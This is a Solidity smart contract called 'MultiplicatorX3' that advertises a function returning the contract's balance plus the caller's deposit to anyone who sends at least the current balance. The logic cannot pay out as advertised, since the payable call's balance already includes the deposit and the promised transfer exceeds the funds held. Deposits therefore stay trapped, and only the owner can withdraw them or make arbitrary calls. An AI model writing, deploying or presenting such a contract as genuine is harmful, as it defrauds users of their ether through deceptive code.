pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    struct State {
        address Owner;
    }
    State private s = State(msg.sender);
    
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        address owner = s.Owner;
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        address owner = s.Owner;
        require(msg.sender == owner);
         
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        uint contractBalance = this.balance;
        uint msgValue = msg.value;
        if(msgValue >= contractBalance)
        {        
            adr.transfer(contractBalance + msgValue);
        }
    }
}